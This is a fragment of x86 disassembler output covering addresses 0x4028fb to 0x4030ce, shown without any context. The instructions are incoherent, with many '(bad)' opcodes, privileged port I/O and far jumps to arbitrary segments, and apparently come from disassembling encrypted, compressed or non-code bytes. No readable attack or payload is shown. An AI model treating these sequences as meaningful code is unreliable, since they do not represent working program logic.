  4028fb:	test   DWORD PTR [esi-0x2d],eax
  4028fe:	fs inc si
  402901:	or     al,0x53
  402903:	shl    DWORD PTR [eax-0x6e47f596],1
  402909:	jmp    0xdec18cc2
  40290e:	push   ss
  40290f:	adc    edi,DWORD PTR [eax-0x29]
  402912:	adc    ebx,esp
  402914:	pop    ds
  402915:	pop    edi
  402916:	ret    
  402917:	sub    eax,0x8d265487
  40291c:	int3   
  40291d:	sub    BYTE PTR [eax+0x2b],bh
  402920:	lahf   
  402921:	retf   0xb9df
  402924:	xchg   DWORD PTR [edx],edi
  402926:	mov    dh,0xf0
  402928:	movzx  ecx,sp
  40292b:	add    esp,DWORD PTR [ebp-0x324ecaf5]
  402931:	icebp  
  402932:	test   eax,0xf14d4970
  402937:	push   ebp
  402938:	cmp    al,0x2
  40293a:	pop    ecx
  40293b:	mov    edi,DWORD PTR [esi]
  40293d:	xor    esp,DWORD PTR [esi+ebp*4]
  402940:	sahf   
  402941:	inc    esp
  402942:	and    eax,DWORD PTR [esi-0x5f]
  402945:	pop    esp
  402946:	sub    eax,0x667817ff
  40294b:	stos   DWORD PTR es:[edi],eax
  40294c:	les    esp,FWORD PTR [edi-0x4bfd8ae9]
  402952:	lds    ebx,FWORD PTR [ebx+0xb]
  402955:	imul   edi,DWORD PTR [edi],0xffffffa1
  402958:	lock inc DWORD PTR [ecx-0x1]
  40295c:	lods   eax,DWORD PTR ds:[esi]
  40295d:	push   esp
  40295e:	out    0x87,eax
  402960:	xor    DWORD PTR [ebx],ebx
  402962:	mov    ch,BYTE PTR [ebx]
  402964:	out    0x37,al
  402966:	push   ss
  402967:	in     al,0xcc
  402969:	or     al,0x58
  40296b:	sub    al,0xe6
  40296d:	dec    esi
  40296e:	outs   dx,BYTE PTR ds:[esi]
  40296f:	xchg   ebp,eax
  402970:	out    0x76,eax
  402972:	pop    ds
  402973:	and    dl,ch
  402975:	fs bnd je 0x402947
  402979:	ss in  eax,dx
  40297b:	into   
  40297c:	call   0x6ed17e62
  402981:	dec    esp
  402982:	mov    ebp,0xbce74a12
  402987:	add    bl,cl
  402989:	add    al,0xa8
  40298b:	js     0x4029f8
  40298d:	push   ecx
  40298e:	and    ch,ah
  402990:	jae    0x402a03
  402992:	dec    esi
  402993:	popf   
  402994:	ret    
  402995:	icebp  
  402996:	cmp    al,0xb4
  402998:	(bad)  
  402999:	daa    
  40299a:	sub    al,0xc0
  40299c:	call   0x9032:0x170115f5
  4029a3:	mov    edi,0xfa9c1ade
  4029a8:	les    esp,FWORD PTR ds:0x9152e7db
  4029ae:	ss cdq 
  4029b0:	jo     0x40296a
  4029b2:	test   DWORD PTR [ebx],esp
  4029b4:	mov    ebx,0x59b7b218
  4029b9:	pop    esp
  4029ba:	mov    bl,0x46
  4029bc:	fwait
  4029bd:	fwait
  4029be:	(bad)  
  4029bf:	adc    BYTE PTR [edx+0x7e],cl
  4029c2:	xchg   ebp,eax
  4029c3:	scas   eax,DWORD PTR es:[edi]
  4029c4:	call   0x4d43:0xe86040f2
  4029cb:	mov    ebx,0x58862143
  4029d0:	sar    BYTE PTR [ebp-0x6c],0xb7
  4029d4:	sbb    DWORD PTR [edi],esi
  4029d6:	push   0x53
  4029d8:	addr16 xchg ecx,eax
  4029da:	push   esp
  4029db:	out    0xde,al
  4029dd:	push   esi
  4029de:	mov    ds:0x249d16e6,al
  4029e3:	cld    
  4029e4:	and    eax,0xa1a637f1
  4029e9:	enter  0xb151,0xda
  4029ed:	xlat   BYTE PTR ds:[ebx]
  4029ee:	test   eax,0x8759045
  4029f3:	add    DWORD PTR [edi-0x7a],esp
  4029f6:	ja     0x4029d9
  4029f8:	stc    
  4029f9:	int    0xec
  4029fb:	xor    esi,DWORD PTR [ebp-0x36]
  4029fe:	repnz mov esp,0x5eeac3df
  402a04:	jne    0x402a08
  402a06:	and    DWORD PTR [edx-0x7b],edx
  402a09:	mov    al,0xc7
  402a0b:	scas   eax,DWORD PTR es:[edi]
  402a0c:	xor    esp,DWORD PTR [eax]
  402a0e:	fmul   DWORD PTR [ecx+0xfd68c09]
  402a14:	popa   
  402a15:	(bad)
  402a18:	loop   0x402a3d
  402a1a:	xor    esi,DWORD PTR gs:[edi+eax*4+0x4a]
  402a1f:	out    0x22,eax
  402a21:	adc    al,0x30
  402a23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a24:	cld    
  402a25:	push   ds
  402a26:	test   ah,bl
  402a28:	ret    
  402a29:	mov    al,0x9e
  402a2b:	jp     0x402a2b
  402a2d:	popa   
  402a2e:	pop    ebp
  402a2f:	les    esi,FWORD PTR [esp+edx*2-0x47b35242]
  402a36:	mov    DWORD PTR [esi+0x124dd75d],esi
  402a3c:	sti    
  402a3d:	mov    dh,0x83
  402a3f:	hlt    
  402a40:	mov    ds:0xdb20b542,eax
  402a45:	(bad)  
  402a46:	mov    ds:0x7d7a2f4b,eax
  402a4b:	adc    esp,esi
  402a4d:	dec    BYTE PTR [edx]
  402a4f:	xchg   BYTE PTR [ecx+eax*1+0x5a],bl
  402a53:	sbb    BYTE PTR [esi+edi*4-0x77],0xf1
  402a58:	cmp    BYTE PTR [edi-0x6],bl
  402a5b:	(bad)  
  402a5d:	add    eax,DWORD PTR [ebp-0x59691cd3]
  402a63:	adc    ebx,DWORD PTR [ecx+0x293d0271]
  402a69:	jb     0x4029fd
  402a6b:	inc    edi
  402a6c:	fwait
  402a6d:	mov    ah,0x40
  402a6f:	dec    esp
  402a70:	and    dl,bl
  402a72:	jg     0x402a76
  402a74:	jle    0x402a29
  402a76:	arpl   WORD PTR [edx-0x6],bp
  402a79:	mov    cl,BYTE PTR [edi-0x22]
  402a7c:	popa   
  402a7d:	cmp    eax,0xdd5af8ee
  402a82:	mov    bh,0x21
  402a84:	push   ebp
  402a85:	lea    esp,[edx]
  402a87:	inc    ebp
  402a88:	fcomip st,st(2)
  402a8a:	stos   BYTE PTR es:[edi],al
  402a8b:	and    bl,BYTE PTR [edi+edx*4-0x25]
  402a8f:	out    0x28,al
  402a91:	loope  0x402a5b
  402a93:	stos   BYTE PTR es:[edi],al
  402a94:	cmc    
  402a95:	into   
  402a96:	aas    
  402a97:	mov    al,ds:0x7930961f
  402a9c:	add    ecx,ebp
  402a9e:	dec    edi
  402a9f:	push   edx
  402aa0:	inc    edi
  402aa1:	mov    ecx,0x4d31b9b4
  402aa6:	cmc    
  402aa7:	xchg   ecx,eax
  402aa8:	in     al,dx
  402aa9:	fdivr  DWORD PTR [eax+0x22ae39b0]
  402aaf:	push   es
  402ab0:	jae    0x402a3f
  402ab2:	mov    esp,0xb89fd5fc
  402ab7:	sbb    eax,0xe8b17a57
  402abc:	mov    BYTE PTR [edx-0x25c5d56f],ah
  402ac2:	inc    ebp
  402ac3:	sbb    dl,0x3a
  402ac6:	pop    ds
  402ac7:	(bad)  
  402ac8:	mov    al,ds:0x25dd79a9
  402acd:	pop    esp
  402ace:	fidiv  DWORD PTR [ecx+0x4ead054c]
  402ad4:	mov    bh,al
  402ad6:	sbb    ah,BYTE PTR [esi]
  402ad8:	push   DWORD PTR [edx+0x33]
  402adb:	outs   dx,BYTE PTR ds:[esi]
  402adc:	xchg   edi,eax
  402add:	xor    al,0x16
  402adf:	fistp  DWORD PTR [esi+edi*4+0x36e8262c]
  402ae6:	jns    0x402a6e
  402ae8:	mov    esp,0x3070791
  402aed:	xchg   esi,eax
  402aee:	add    al,0x70
  402af0:	or     cl,BYTE PTR [ebp-0x24ed077b]
  402af6:	arpl   WORD PTR ds:0xfa0941a2,dx
  402afc:	loop   0x402b60
  402afe:	adc    edi,edx
  402b00:	int    0xde
  402b02:	aad    0xef
  402b04:	sub    DWORD PTR [esi-0x726875bf],ebx
  402b0a:	test   al,0x60
  402b0c:	and    edx,DWORD PTR [ecx]
  402b0e:	sti    
  402b0f:	fs hlt 
  402b11:	or     al,0x89
  402b13:	push   eax
  402b14:	or     dl,BYTE PTR [ecx-0x6ffdaa39]
  402b1a:	ret    0xf6f9
  402b1d:	push   eax
  402b1e:	cdq    
  402b1f:	lods   eax,DWORD PTR ds:[esi]
  402b20:	push   esp
  402b21:	xor    BYTE PTR [esp+ecx*8-0x7e3136c3],0x5f
  402b29:	sbb    dh,ch
  402b2b:	popf   
  402b2c:	lea    esi,[ebx-0x2d]
  402b2f:	enter  0xb993,0x9d
  402b33:	ja     0x402aba
  402b35:	lock mov bl,0x65
  402b38:	push   cs
  402b39:	fcomp  st(4)
  402b3b:	loope  0x402af1
  402b3d:	jmp    0x519:0x8ed24eb7
  402b44:	or     edi,esi
  402b46:	data16 js 0x402bc4
  402b49:	out    0x56,al
  402b4b:	cmp    BYTE PTR [ebp-0x7a],bl
  402b4e:	popf   
  402b4f:	inc    esi
  402b50:	in     eax,dx
  402b51:	mov    dl,BYTE PTR [esi+0x5ca47ca3]
  402b57:	leave  
  402b58:	dec    edx
  402b59:	sbb    eax,0x217992d1
  402b5e:	add    edi,DWORD PTR [ecx-0x6a0d5723]
  402b64:	mov    eax,0x1e1f6bfd
  402b69:	in     eax,0xf0
  402b6b:	out    0x70,al
  402b6d:	or     al,0x2d
  402b6f:	jg     0x402b03
  402b71:	dec    esi
  402b72:	ss push 0xffffffe8
  402b75:	mov    dh,0x8e
  402b77:	push   0xffffff8e
  402b79:	and    DWORD PTR [ecx+0x78],0xffffffa4
  402b7d:	lods   al,BYTE PTR ds:[esi]
  402b7e:	shl    DWORD PTR [ebx+ebp*1+0x777f94f3],0x3c
  402b86:	mov    ecx,ebx
  402b88:	adc    ah,BYTE PTR [ecx-0x3e]
  402b8b:	mov    eax,0x52f575aa
  402b90:	ret    
  402b91:	jo     0x402c0e
  402b93:	sbb    BYTE PTR [esi-0x14cdaf48],al
  402b99:	xor    eax,0xb8bff258
  402b9e:	inc    edx
  402b9f:	mov    dh,0xbc
  402ba1:	mov    dh,0xf7
  402ba3:	and    al,0xe2
  402ba5:	xchg   edi,eax
  402ba6:	or     ebp,DWORD PTR [ebp+0x346a09ba]
  402bac:	outs   dx,DWORD PTR ds:[esi]
  402bad:	adc    al,0x9e
  402baf:	sbb    dh,bl
  402bb1:	mov    eax,ds:0xb186afd3
  402bb6:	push   ss
  402bb7:	xchg   esp,edx
  402bb9:	loop   0x402c0d
  402bbb:	ds jmp 0x93fc32fe
  402bc1:	enter  0x6eb0,0x41
  402bc5:	cld    
  402bc6:	into   
  402bc7:	sub    DWORD PTR [ebp+0x681314fd],edi
  402bcd:	jne    0x402c02
  402bcf:	add    edi,ebx
  402bd1:	sbb    ah,0x7e
  402bd4:	dec    eax
  402bd5:	sub    esp,DWORD PTR [eax]
  402bd7:	dec    edi
  402bd8:	test   bl,dh
  402bda:	in     eax,0x57
  402bdc:	lahf   
  402bdd:	xor    edi,ebp
  402bdf:	mov    esp,0x6727337d
  402be4:	sbb    bh,bh
  402be6:	inc    esi
  402be7:	popf   
  402be8:	jb     0x402c61
  402bea:	aas    
  402beb:	push   0x319085f2
  402bf0:	repz aam 0xc8
  402bf3:	jecxz  0x402c4b
  402bf5:	(bad)  
  402bf6:	jmp    0x402b9b
  402bf8:	bound  ebp,QWORD PTR [esi]
  402bfa:	xor    dl,dl
  402bfc:	rcr    BYTE PTR [ebp-0x1f7632fd],0x76
  402c03:	ret    0x51a1
  402c06:	div    DWORD PTR [eax-0x13]
  402c09:	pushf  
  402c0a:	lods   eax,DWORD PTR ds:[esi]
  402c0b:	pop    ebp
  402c0c:	mov    edx,0xb7ff0a6e
  402c11:	daa    
  402c12:	inc    ebp
  402c13:	jbe    0x402bf8
  402c15:	and    ebp,DWORD PTR [edi-0x65e52474]
  402c1b:	je     0x402bb7
  402c1d:	xor    al,0x3b
  402c1f:	dec    edi
  402c20:	lods   al,BYTE PTR ds:[esi]
  402c21:	retf   0xfcdc
  402c24:	mov    ecx,0xebbe7c48
  402c29:	mov    edi,0xc30d4521
  402c2e:	pop    edi
  402c2f:	jne    0x402bbb
  402c31:	lahf   
  402c32:	inc    edx
  402c33:	xor    eax,0xf152bae
  402c38:	test   DWORD PTR [ecx-0x66],eax
  402c3b:	or     ah,BYTE PTR [esi+edx*1-0x72]
  402c3f:	idiv   al
  402c41:	and    esi,edx
  402c43:	repnz mov cl,0x19
  402c46:	repz dec eax
  402c48:	cmp    al,0xc3
  402c4a:	in     al,0xef
  402c4c:	stc    
  402c4d:	and    BYTE PTR [edx+0x14],ah
  402c50:	xor    eax,0xd4adef8b
  402c55:	jo     0x402c5c
  402c57:	cmp    eax,0xb82a7816
  402c5c:	enter  0xb83f,0x78
  402c60:	repnz cld 
  402c62:	push   cs
  402c63:	aaa    
  402c64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c65:	in     eax,dx
  402c66:	pusha  
  402c67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c68:	in     al,0x5
  402c6a:	call   FWORD PTR [ebx+0x17]
  402c6d:	imul   esi,DWORD PTR [ebx],0xffffffc9
  402c70:	pop    ebp
  402c71:	arpl   WORD PTR [eax+0x3c],dx
  402c74:	ror    DWORD PTR [eax-0x4e],cl
  402c77:	lea    ecx,[edi+0xb6cd98c]
  402c7d:	jmp    0xfdf7:0xee1d0b30
  402c84:	cmp    esp,DWORD PTR ss:[ebp+0xe3349f4]
  402c8b:	(bad)  
  402c8d:	jnp    0x402ca8
  402c8f:	mov    WORD PTR [edx+edi*2],?
  402c92:	das    
  402c93:	fist   DWORD PTR ds:0xc339697d
  402c99:	cld    
  402c9a:	iret   
  402c9b:	sti    
  402c9c:	js     0x402c72
  402c9e:	out    0x24,eax
  402ca0:	push   es
  402ca1:	cmp    di,ax
  402ca4:	or     DWORD PTR [ebx-0x5],edx
  402ca7:	loope  0x402caf
  402ca9:	mov    al,ds:0x1abdb1d4
  402cae:	cmp    al,0xa5
  402cb0:	test   BYTE PTR [ebp-0x5de285e8],al
  402cb6:	fdivrp st(5),st
  402cb8:	adc    BYTE PTR [eax-0x3e8a16ed],ah
  402cbe:	ss mov cl,al
  402cc1:	pop    ss
  402cc2:	push   fs
  402cc4:	enter  0x44a6,0xfc
  402cc8:	mov    esp,0xf524a431
  402ccd:	xchg   edx,eax
  402cce:	ja     0x402c7d
  402cd0:	cmp    BYTE PTR [ebx],dl
  402cd2:	inc    eax
  402cd3:	mov    ecx,0x92423342
  402cd8:	stos   DWORD PTR es:[edi],eax
  402cd9:	data16 mov ds:0x3c462f03,al
  402cdf:	outs   dx,BYTE PTR ds:[esi]
  402ce0:	mov    bh,0x20
  402ce2:	test   esp,esi
  402ce4:	jno    0x402d4e
  402ce6:	push   es
  402ce7:	shl    DWORD PTR [edx-0x65a04f9e],1
  402ced:	or     BYTE PTR [edx],dh
  402cef:	inc    esp
  402cf0:	push   cs
  402cf1:	pop    ds
  402cf2:	test   ecx,esp
  402cf4:	pop    ecx
  402cf5:	and    al,BYTE PTR [eax]
  402cf7:	xchg   esi,eax
  402cf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cf9:	inc    ecx
  402cfa:	jmp    0xdcb7:0xedc724ad
  402d01:	add    cl,BYTE PTR [ecx-0x42]
  402d04:	call   0x2016:0x3f6a7b0c
  402d0b:	and    BYTE PTR [edi-0x1f],al
  402d0e:	dec    ecx
  402d0f:	loop   0x402d82
  402d11:	rcl    BYTE PTR [ebp+0x12],1
  402d14:	pop    es
  402d15:	sub    edx,ebx
  402d17:	sbb    ebp,ebx
  402d19:	push   cs
  402d1a:	inc    ecx
  402d1b:	and    DWORD PTR [esi-0x34fbd505],edx
  402d21:	jge    0x402d60
  402d23:	or     BYTE PTR ds:0x5acd766c,bh
  402d29:	xchg   edi,eax
  402d2a:	xchg   esi,eax
  402d2b:	mov    esp,0x140c901e
  402d30:	push   0xfffffff4
  402d32:	into   
  402d33:	lahf   
  402d34:	pop    ecx
  402d35:	add    ch,0xab
  402d38:	in     eax,0x80
  402d3a:	mov    BYTE PTR [edx-0x2d849d93],0x1e
  402d41:	mov    edi,0x81a222b4
  402d46:	inc    edi
  402d47:	mov    esi,0x15d7de36
  402d4c:	mov    ebp,DWORD PTR [ecx+eax*4+0x40]
  402d50:	rol    BYTE PTR [eax-0x3e52e3a1],1
  402d56:	shl    DWORD PTR [esi-0x158d2d41],0x64
  402d5d:	mov    esi,0x3fe7e2fe
  402d62:	xchg   BYTE PTR [ecx],ch
  402d64:	dec    edi
  402d65:	xor    al,0xef
  402d67:	add    al,0xf0
  402d69:	mov    WORD PTR [edi-0x65351f4f],cs
  402d6f:	xchg   edi,eax
  402d70:	jns    0x402d88
  402d72:	jb     0x402d29
  402d74:	dec    esp
  402d75:	adc    cl,dh
  402d77:	scas   al,BYTE PTR es:[edi]
  402d78:	shl    ah,0x8b
  402d7b:	retf   0xd28e
  402d7e:	mov    ?,WORD PTR [ebp+0x7c]
  402d81:	pop    esp
  402d82:	jle    0x402de1
  402d84:	out    dx,eax
  402d85:	bound  edx,QWORD PTR [ebx-0x4b]
  402d88:	(bad)  
  402d8a:	sub    DWORD PTR [edx-0x22],esi
  402d8d:	outs   dx,BYTE PTR ds:[esi]
  402d8e:	jmp    0x29f2:0xdf950c0b
  402d95:	push   ebx
  402d96:	push   eax
  402d97:	mov    edi,0xa9cdf109
  402d9c:	jae    0x402d73
  402d9e:	push   edx
  402d9f:	mov    eax,0x5c2c5757
  402da4:	or     DWORD PTR [ebx+0x2abdebe8],ebp
  402daa:	jmp    FWORD PTR [edi-0x710840c3]
  402db0:	ror    DWORD PTR [ebp-0x67eedbc5],0xc8
  402db7:	and    eax,esi
  402db9:	xor    al,0xa1
  402dbb:	sbb    bl,ah
  402dbd:	mov    WORD PTR [ecx],?
  402dbf:	cmp    bh,BYTE PTR [ecx]
  402dc1:	data16 (bad) 
  402dc3:	(bad)  
  402dc4:	out    0xe1,al
  402dc6:	cmp    eax,DWORD PTR [eax+0x79]
  402dc9:	or     eax,0x226789c4
  402dce:	pop    edx
  402dcf:	imul   esi,edx,0x12a4e8d4
  402dd5:	xchg   edi,eax
  402dd6:	in     eax,0xd8
  402dd8:	fild   DWORD PTR [esi+edx*2]
  402ddb:	mov    ebp,0xa8f3ed2
  402de0:	repz and BYTE PTR [eax],dl
  402de3:	(bad)  
  402de4:	xchg   ecx,eax
  402de5:	ds mov al,0x55
  402de8:	dec    ebp
  402de9:	inc    edx
  402dea:	ins    BYTE PTR es:[edi],dx
  402deb:	je     0x402e34
  402ded:	add    dl,bh
  402def:	or     al,0xc8
  402df1:	xor    ebp,esp
  402df3:	cmp    BYTE PTR [eax+edi*2-0x16],bh
  402df7:	xchg   esp,eax
  402df8:	adc    eax,DWORD PTR [edi]
  402dfa:	in     eax,0xde
  402dfc:	sti    
  402dfd:	adc    dh,BYTE PTR [ebp+0x28]
  402e00:	xchg   ebp,eax
  402e01:	outs   dx,DWORD PTR es:[esi]
  402e03:	mov    ds:0xa3b1478c,al
  402e08:	jp     0x402db6
  402e0a:	sar    BYTE PTR [edx-0x24],cl
  402e0d:	mov    al,0xda
  402e0f:	push   esi
  402e10:	sbb    eax,esp
  402e12:	inc    bp
  402e14:	stc    
  402e15:	push   ss
  402e16:	and    BYTE PTR [eax],cl
  402e18:	adc    DWORD PTR [eax-0x48],edx
  402e1b:	lea    esi,[eax+0x3b57a0bb]
  402e21:	mov    bl,0x21
  402e23:	not    ah
  402e25:	and    esp,0xe8c639b6
  402e2b:	or     eax,0x7ee71099
  402e30:	xchg   esp,eax
  402e31:	stc    
  402e32:	sar    DWORD PTR [ebp+0x5f],cl
  402e35:	std    
  402e36:	pop    esp
  402e37:	rcl    DWORD PTR [ebp+0x10],cl
  402e3a:	mov    ebp,0x64c3635
  402e3f:	(bad)  
  402e40:	nop
  402e41:	adc    eax,DWORD PTR [edi+esi*1]
  402e44:	fnstsw WORD PTR [ebp+0x42]
  402e47:	retf   0x39f6
  402e4a:	bound  edi,QWORD PTR fs:[edx+0x5f]
  402e4e:	mov    edi,0x515cae2b
  402e53:	je     0x402e4b
  402e55:	cmp    bl,BYTE PTR [edi+0x71]
  402e58:	add    DWORD PTR [esp+eax*1-0x33b9823a],eax
  402e5f:	imul   esp,DWORD PTR [edi],0x1a7c83ae
  402e65:	shl    dh,0x2f
  402e68:	cs add ebp,0xfffffff2
  402e6c:	inc    edx
  402e6d:	dec    esp
  402e6e:	fisubr DWORD PTR [ebx+0x5ef84ecd]
  402e74:	std    
  402e75:	push   esp
  402e76:	lahf   
  402e77:	dec    eax
  402e78:	sub    ebx,ebp
  402e7a:	add    ebp,DWORD PTR [ebx]
  402e7c:	arpl   WORD PTR [ebp-0x1ff5bd04],si
  402e82:	(bad)  
  402e83:	shl    BYTE PTR [eax+0x23f2f8d2],0xf2
  402e8a:	std    
  402e8b:	out    0x73,eax
  402e8d:	pop    es
  402e8e:	and    ebx,edi
  402e90:	aad    0x7e
  402e92:	lahf   
  402e93:	retf   
  402e94:	pop    ecx
  402e95:	scas   eax,DWORD PTR es:[edi]
  402e96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e97:	cmp    dh,ch
  402e99:	mov    edx,0x8bcc1c0c
  402e9e:	into   
  402e9f:	pop    eax
  402ea0:	cwde   
  402ea1:	pop    es
  402ea2:	lods   al,BYTE PTR ds:[esi]
  402ea3:	cwde   
  402ea4:	adc    esi,DWORD PTR [ebx]
  402ea6:	xchg   edi,eax
  402ea7:	pop    edi
  402ea8:	call   DWORD PTR ds:0x89f4da59
  402eae:	pop    ss
  402eaf:	cwde   
  402eb0:	clc    
  402eb1:	hlt    
  402eb2:	jmp    0x711e:0xad14f00e
  402eb9:	adc    DWORD PTR [eax+0x4dc4afe7],0xffffffb9
  402ec0:	ret    0xcdc9
  402ec3:	mov    edi,0x9b550a84
  402ec8:	(bad)  
  402ec9:	push   ds
  402eca:	dec    esi
  402ecb:	adc    DWORD PTR ds:0x47bc129c,esp
  402ed1:	pop    esi
  402ed2:	cmp    esp,ebx
  402ed4:	cli    
  402ed5:	je     0x402ec9
  402ed7:	in     al,0xc4
  402ed9:	test   BYTE PTR [ecx+0x6a],bl
  402edc:	ffree  st(1)
  402ede:	aas    
  402edf:	jb     0x402e80
  402ee1:	retf   0x8c10
  402ee4:	mov    ebp,0xc1a4f019
  402ee9:	shr    DWORD PTR [ebp+0x7f],cl
  402eec:	xchg   edi,eax
  402eed:	ret    
  402eee:	add    al,0xbb
  402ef0:	loopne 0x402ede
  402ef2:	into   
  402ef3:	test   ah,cl
  402ef5:	fistp  WORD PTR [ebx-0x401fba97]
  402efb:	in     al,0x7a
  402efd:	jae    0x402e86
  402eff:	loop   0x402f11
  402f01:	test   ah,ch
  402f03:	sahf   
  402f04:	xor    ah,BYTE PTR [ebx]
  402f06:	mov    eax,ds:0x783ff6ac
  402f0b:	daa    
  402f0c:	cmp    esp,DWORD PTR [edx+0x11be4327]
  402f12:	mov    bh,0x90
  402f14:	(bad)  
  402f16:	ja     0x402f2a
  402f18:	push   es
  402f19:	adc    DWORD PTR [ebp-0x3b],ebx
  402f1c:	stos   DWORD PTR es:[edi],eax
  402f1d:	out    0xac,eax
  402f1f:	sub    al,0x49
  402f21:	push   ecx
  402f22:	rol    ebp,cl
  402f24:	lahf   
  402f25:	mov    BYTE PTR [ebx],al
  402f27:	out    0x5f,al
  402f29:	add    ch,BYTE PTR [ebx+0x3c83f8da]
  402f2f:	and    ecx,edi
  402f31:	fisub  DWORD PTR [esi]
  402f33:	(bad)  
  402f34:	(bad)  
  402f35:	mov    WORD PTR [edx],?
  402f37:	push   esp
  402f38:	cld    
  402f39:	xchg   esp,eax
  402f3a:	das    
  402f3b:	inc    edx
  402f3c:	push   cs
  402f3d:	rcl    DWORD PTR [esi+edx*1+0x16],1
  402f41:	adc    esi,DWORD PTR [edi]
  402f43:	test   BYTE PTR [esi-0x3878cc47],0xc
  402f4a:	daa    
  402f4b:	mov    ch,0xd2
  402f4d:	div    DWORD PTR [ebx]
  402f4f:	aad    0x8d
  402f51:	dec    esi
  402f52:	and    esp,esp
  402f54:	xchg   BYTE PTR [eax],al
  402f56:	mov    bh,0x5f
  402f58:	dec    edx
  402f59:	xor    al,0xf7
  402f5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f5c:	fcomp  QWORD PTR [edx-0x6d8ce418]
  402f62:	sti    
  402f63:	stos   BYTE PTR es:[edi],al
  402f64:	in     eax,0x21
  402f66:	into   
  402f67:	or     al,0x1c
  402f69:	xor    DWORD PTR [esi+0x7b],eax
  402f6c:	sbb    bh,BYTE PTR [esp+ebx*8]
  402f6f:	inc    ebx
  402f70:	popf   
  402f71:	retf   0x92ed
  402f74:	scas   al,BYTE PTR es:[edi]
  402f75:	cmp    eax,0x793ee64f
  402f7a:	hlt    
  402f7b:	ds cwde 
  402f7d:	pushf  
  402f7e:	call   FWORD PTR [edi+0x1be82417]
  402f84:	cmp    esi,esp
  402f86:	push   eax
  402f87:	mov    ah,0x1a
  402f89:	int3   
  402f8a:	ins    BYTE PTR es:[edi],dx
  402f8b:	mov    edi,0x2f9acfc5
  402f90:	vcmppd ymm3,ymm0,YMMWORD PTR [eax],0x6e
  402f95:	jmp    0xc8713c9a
  402f9a:	xchg   DWORD PTR [eax+0x3e89bfbd],eax
  402fa0:	push   esp
  402fa1:	adc    DWORD PTR [ecx],esi
  402fa3:	inc    ebx
  402fa4:	shl    ch,cl
  402fa6:	mov    ecx,0x9ad34e4c
  402fab:	cmp    al,0x7d
  402fae:	cld    
  402faf:	sub    eax,0x21463ed9
  402fb4:	not    BYTE PTR [esi+eax*4-0x21]
  402fb8:	bound  ecx,QWORD PTR [eax-0x60]
  402fbb:	pusha  
  402fbc:	test   BYTE PTR [edx+0xd8985fa],dl
  402fc2:	test   al,0xe5
  402fc4:	sbb    al,0x1a
  402fc6:	xor    esi,DWORD PTR [eax+0x1f50f883]
  402fcc:	repnz hlt 
  402fce:	or     al,0x14
  402fd0:	rol    edi,1
  402fd2:	and    DWORD PTR [ebx+0x234d80cf],esi
  402fd8:	shl    DWORD PTR [ebx-0x39d611ae],cl
  402fde:	ins    DWORD PTR es:[edi],dx
  402fdf:	xchg   DWORD PTR ds:0x45fd6d14,edx
  402fe5:	fsub   DWORD PTR [eax-0x90fd574]
  402feb:	mov    bh,0x25
  402fed:	rcl    BYTE PTR [si],cl
  402ff0:	sub    cl,BYTE PTR [ebx-0x70]
  402ff3:	(bad)  
  402ff4:	mov    WORD PTR [ebp-0x218601ed],?
  402ffa:	sbb    eax,0x26f8be18
  402fff:	push   esp
  403000:	cmp    DWORD PTR [edi],edx
  403002:	out    0x98,al
  403004:	cmp    eax,0x712d5f43
  403009:	jnp    0x402fe2
  40300b:	mov    WORD PTR [edx+0x3292ce51],ss
  403011:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403012:	clc    
  403013:	shl    ecx,0xb6
  403016:	sub    dl,BYTE PTR [eax]
  403018:	inc    edx
  403019:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40301a:	imul   edx,DWORD PTR [edi+0x6d],0xffffffaa
  40301e:	repnz cwde 
  403020:	imul   esp,DWORD PTR [ecx-0x4ad08399],0x5a
  403027:	jmp    0x403048
  403029:	pop    ecx
  40302a:	scas   eax,DWORD PTR es:[edi]
  40302b:	inc    ecx
  40302c:	dec    eax
  40302d:	scas   al,BYTE PTR es:[edi]
  40302e:	mov    eax,ds:0xd4c2d4b8
  403033:	test   al,ah
  403035:	pop    ecx
  403036:	imul   DWORD PTR [esi]
  403038:	aaa    
  403039:	jg     0x40309f
  40303b:	cmp    eax,0x365239d9
  403040:	mov    DWORD PTR [ebp-0x23],ebp
  403043:	cld    
  403044:	xor    cx,bp
  403047:	adc    al,0x71
  403049:	mov    edx,?
  40304b:	dec    edx
  40304c:	frndint 
  40304e:	add    al,0xb4
  403050:	ins    BYTE PTR es:[edi],dx
  403051:	xchg   edx,eax
  403052:	sub    DWORD PTR [ebp-0x69450f93],esp
  403058:	mov    bl,ch
  40305a:	aaa    
  40305b:	adc    dl,BYTE PTR [edx+eax*2-0x4f]
  40305f:	dec    ecx
  403060:	cmp    DWORD PTR [ebx+0x72226553],ebp
  403066:	mov    WORD PTR [esi-0xee428a0],ds
  40306c:	dec    ebx
  40306d:	leave  
  40306e:	adc    BYTE PTR [esi+0x67],cl
  403071:	inc    eax
  403072:	dec    esp
  403073:	jp     0x4030e1
  403075:	push   esi
  403076:	and    eax,0xa1660d7e
  40307b:	xor    BYTE PTR [eax+ecx*8],bh
  40307e:	push   ss
  40307f:	stos   DWORD PTR es:[edi],eax
  403080:	rcr    BYTE PTR [ecx],cl
  403082:	mov    ds:0x81466bf3,eax
  403087:	icebp  
  403088:	mov    DWORD PTR [eax-0x52fd2458],0xe10a3ef
  403092:	(bad)  
  403093:	mov    eax,0xcc5e4aa7
  403098:	push   edi
  403099:	push   edx
  40309a:	xchg   ebp,eax
  40309b:	test   DWORD PTR [edx+0x2e804373],edx
  4030a1:	das    
  4030a2:	add    BYTE PTR [eax+0x6d],bl
  4030a5:	lods   al,BYTE PTR ds:[esi]
  4030a6:	xchg   esp,eax
  4030a7:	mov    eax,0xf849dcd9
  4030ac:	cmp    ecx,DWORD PTR [esi]
  4030ae:	cwde   
  4030af:	mov    ds:0xe01adb2d,eax
  4030b4:	cmp    al,0xa3
  4030b6:	or     eax,0x85f343f0
  4030bb:	stc    
  4030bc:	repz (bad) 
  4030be:	xchg   ecx,eax
  4030bf:	mov    ebp,0xd60504d1
  4030c4:	out    0x6c,eax
  4030c6:	push   esp
  4030c7:	push   edi
  4030c8:	push   ss
  4030c9:	jbe    0x40311a
  4030cb:	jbe    0x403124
  4030cd:	xchg   edx,eax
  4030ce:	fnstsw WORD PTR [edx]
